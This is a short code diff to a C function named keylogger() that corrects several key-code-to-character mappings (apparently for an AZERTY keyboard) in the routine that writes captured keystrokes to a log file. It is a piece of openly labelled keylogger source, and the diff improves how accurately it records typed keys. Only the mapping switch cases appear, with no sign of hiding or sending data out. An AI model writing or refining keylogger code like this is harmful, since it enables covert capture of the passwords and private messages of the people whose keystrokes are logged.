@@ -73,7 +73,7 @@ void keylogger()
 					write(log, "8", 1);
 					break;
 				case 10:
-					write(log, "0", 1);
+					write(log, "9", 1);
 					break;
 				case 11:
 					write(log, "0", 1);
@@ -91,7 +91,7 @@ void keylogger()
 					write(log, "\t", 1);
 					break;
 				case 16:
-					write(log, "a", 1);
+					write(log, "q", 1);
 					break;	
 				case 17:
 					write(log, "z", 1);
@@ -127,7 +127,7 @@ void keylogger()
 					write(log, "[CTRL]", 6);
 					break;
 				case 30:
-					write(log, "q", 1);
+					write(log, "a", 1);
 					break;
 				case 31:
 					write(log, "s", 1);
@@ -154,7 +154,7 @@ void keylogger()
 					write(log, "l", 1);
 					break;
 				case 39:
-					write(log, ",", 1);
+					write(log, "m", 1);
 					break;
 				case 40:
 					write(log, "%", 1);
@@ -187,7 +187,7 @@ void keylogger()
 					write(log, "n", 1);
 					break;
 				case 50:
-					write(log, "m", 1);
+					write(log, ",", 1);
 					break;
 				case 51:
 					write(log, ";", 1);
